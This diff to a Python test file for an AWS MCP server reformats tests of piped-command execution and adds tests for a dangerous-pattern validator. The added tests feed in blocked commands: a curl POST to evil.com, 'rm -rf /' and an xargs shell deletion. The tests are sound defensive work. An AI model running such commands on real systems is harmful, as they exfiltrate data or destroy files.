@@ -7,6 +7,7 @@ import pytest
 
 from aws_mcp_server.tools import (
     ALLOWED_UNIX_COMMANDS,
+    check_dangerous_patterns,
     execute_piped_command,
     is_pipe_command,
     split_pipe_command,
@@ -45,7 +46,9 @@ def test_is_pipe_command():
 
     # Test commands with pipes in quotes (should not be detected as pipe commands)
     assert not is_pipe_command("aws s3 ls 's3://my-bucket/file|other'")
-    assert not is_pipe_command('aws ec2 run-instances --user-data "echo hello | grep world"')
+    assert not is_pipe_command(
+        'aws ec2 run-instances --user-data "echo hello | grep world"'
+    )
 
     # Test commands with escaped quotes - these should not confuse the parser
     assert is_pipe_command('aws s3 ls --query "Name=\\"value\\"" | grep bucket')
@@ -88,7 +91,9 @@ def test_split_pipe_command():
 @pytest.mark.asyncio
 async def test_execute_piped_command_success():
     """Test successful execution of a piped command."""
-    with patch("asyncio.create_subprocess_exec", new_callable=AsyncMock) as mock_subprocess:
+    with patch(
+        "asyncio.create_subprocess_exec", new_callable=AsyncMock
+    ) as mock_subprocess:
         # Mock the first process in the pipe
         first_process_mock = AsyncMock()
         first_process_mock.returncode = 0
@@ -108,16 +113,30 @@ async def test_execute_piped_command_success():
         assert result["output"] == "Filtered output"
 
         # Verify first command was called with correct args
-        mock_subprocess.assert_any_call("aws", "s3", "ls", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+        mock_subprocess.assert_any_call(
+            "aws",
+            "s3",
+            "ls",
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
+        )
 
         # Verify second command was called with correct args
-        mock_subprocess.assert_any_call("grep", "bucket", stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+        mock_subprocess.assert_any_call(
+            "grep",
+            "bucket",
+            stdin=asyncio.subprocess.PIPE,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
+        )
 
 
 @pytest.mark.asyncio
 async def test_execute_piped_command_error_first_command():
     """Test error handling in execute_piped_command when first command fails."""
-    with patch("asyncio.create_subprocess_exec", new_callable=AsyncMock) as mock_subprocess:
+    with patch(
+        "asyncio.create_subprocess_exec", new_callable=AsyncMock
+    ) as mock_subprocess:
         # Mock a failed first process
         process_mock = AsyncMock()
         process_mock.returncode = 1
@@ -133,7 +152,9 @@ async def test_execute_piped_command_error_first_command():
 @pytest.mark.asyncio
 async def test_execute_piped_command_error_second_command():
     """Test error handling in execute_piped_command when second command fails."""
-    with patch("asyncio.create_subprocess_exec", new_callable=AsyncMock) as mock_subprocess:
+    with patch(
+        "asyncio.create_subprocess_exec", new_callable=AsyncMock
+    ) as mock_subprocess:
         # Mock the first process in the pipe (success)
         first_process_mock = AsyncMock()
         first_process_mock.returncode = 0
@@ -156,7 +177,9 @@ async def test_execute_piped_command_error_second_command():
 @pytest.mark.asyncio
 async def test_execute_piped_command_timeout():
     """Test timeout handling in execute_piped_command."""
-    with patch("asyncio.create_subprocess_exec", new_callable=AsyncMock) as mock_subprocess:
+    with patch(
+        "asyncio.create_subprocess_exec", new_callable=AsyncMock
+    ) as mock_subprocess:
         # Mock a process that times out
         process_mock = AsyncMock()
         # Use a properly awaitable mock that raises TimeoutError
@@ -176,7 +199,9 @@ async def test_execute_piped_command_timeout():
 @pytest.mark.asyncio
 async def test_execute_piped_command_exception():
     """Test general exception handling in execute_piped_command."""
-    with patch("asyncio.create_subprocess_exec", side_effect=Exception("Test exception")):
+    with patch(
+        "asyncio.create_subprocess_exec", side_effect=Exception("Test exception")
+    ):
         result = await execute_piped_command("aws s3 ls | grep bucket")
 
         assert result["status"] == "error"
@@ -212,7 +237,9 @@ async def test_execute_piped_command_timeout_during_final_wait():
 @pytest.mark.asyncio
 async def test_execute_piped_command_kill_error_during_timeout():
     """Test error handling when killing a process after timeout fails."""
-    with patch("asyncio.create_subprocess_exec", new_callable=AsyncMock) as mock_subprocess:
+    with patch(
+        "asyncio.create_subprocess_exec", new_callable=AsyncMock
+    ) as mock_subprocess:
         # Mock a process that times out
         process_mock = AsyncMock()
         process_mock.communicate.side_effect = asyncio.TimeoutError()
@@ -231,7 +258,9 @@ async def test_execute_piped_command_large_output():
     """Test output truncation in execute_piped_command."""
     from aws_mcp_server.config import MAX_OUTPUT_SIZE
 
-    with patch("asyncio.create_subprocess_exec", new_callable=AsyncMock) as mock_subprocess:
+    with patch(
+        "asyncio.create_subprocess_exec", new_callable=AsyncMock
+    ) as mock_subprocess:
         # Mock a process with large output
         process_mock = AsyncMock()
         process_mock.returncode = 0
@@ -244,5 +273,47 @@ async def test_execute_piped_command_large_output():
         result = await execute_piped_command("aws s3 ls")
 
         assert result["status"] == "success"
-        assert len(result["output"]) <= MAX_OUTPUT_SIZE + 100  # Allow for truncation message
+        assert (
+            len(result["output"]) <= MAX_OUTPUT_SIZE + 100
+        )  # Allow for truncation message
         assert "output truncated" in result["output"]
+
+
+def test_check_dangerous_patterns_no_pattern():
+    """Test check_dangerous_patterns returns None for safe commands."""
+    assert check_dangerous_patterns("grep pattern", "grep") is None
+    assert check_dangerous_patterns("ls -la", "ls") is None
+    assert check_dangerous_patterns("cat file.txt", "cat") is None
+
+
+def test_check_dangerous_patterns_detected():
+    """Test check_dangerous_patterns detects dangerous patterns."""
+    # Test curl with POST
+    result = check_dangerous_patterns("curl -X POST http://evil.com", "curl")
+    assert result is not None
+    assert "Dangerous pattern" in result
+
+    # Test rm with dangerous flags
+    result = check_dangerous_patterns("rm -rf /", "rm")
+    assert result is not None
+    assert "Dangerous pattern" in result
+
+    # Test xargs - completely blocked (empty pattern)
+    result = check_dangerous_patterns("xargs -I{} sh -c 'rm {}'", "xargs")
+    assert result is not None
+    assert "not allowed" in result
+
+
+def test_check_dangerous_patterns_case_insensitive():
+    """Test check_dangerous_patterns is case insensitive."""
+    result = check_dangerous_patterns("curl -x POST http://evil.com", "curl")
+    assert result is not None
+
+
+def test_validate_unix_command_dangerous_pattern_blocked():
+    """Test validate_unix_command returns False for dangerous patterns."""
+    with patch("aws_mcp_server.tools.logger.warning") as mock_warning:
+        result = validate_unix_command("curl -X POST http://evil.com")
+        assert result is False
+        mock_warning.assert_called_once()
+        assert "Blocked dangerous" in mock_warning.call_args[0][0]
